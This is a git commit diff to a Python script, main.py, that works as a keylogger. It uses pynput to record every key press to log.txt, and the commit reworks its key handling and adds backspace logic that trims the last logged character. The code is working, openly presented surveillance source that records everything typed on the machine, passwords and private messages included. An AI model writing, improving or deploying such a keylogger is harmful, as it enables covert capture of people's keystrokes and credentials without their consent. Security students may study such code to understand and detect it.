c8ca90213378f09d681682df58e2b13866389faf
Alfdzrii <Alfadzri.Abhipraya@gmail.com>
2025-12-30 15:04:36 +0700

    adding backspace configuration

--- main.py
+++ main.py
@@ -2,27 +2,30 @@ from pynput.keyboard import Listener, Key
 
 def writetofile(key):
     letter = str(key)
-    # ======== key replace ========
+    # key replace
     letter = letter.replace("'","")
-    if letter == "key.alt":
-        letter = ""
-    if letter == "Key.space":
-        letter = " "
-    if letter == "Key.enter":
-        letter = "\n"
-    if letter == "Key.backspace":
-        letter.removeprefix()
-    letter = letter.replace("Key.backspace"," (user press backspace) ")
+    letter = letter.replace("Key.enter","\n")
+    letter = letter.replace("Key.space"," ")
     letter = letter.replace("Key.tab","\t")
-    letter = letter.replace("Key.ctrlz "," (user press ctrlZ) ")
+    letter = letter.replace("Key.ctrl", "")
     letter = letter.replace("Key.ctrls ","")
     letter = letter.replace("Key.alt","")
+    letter = letter.replace("Key.shift ","")
+    # backspace logic
+    if letter == "Key.backspace":
+        try:
+            with open("log.txt","r") as file:
+                fileContent = file.read()
+            with open("log.txt","w") as file:
+                file.write(fileContent[:-1])
 
+        except FileNotFoundError:
+            pass
+        letter = ""
 
-    # creating the file for the keystroke 
+    # creating the file for the keystroke
     with open("log.txt","a") as file:
         file.write(letter)
 
 with Listener(on_press = writetofile) as l:
     l.join()
-
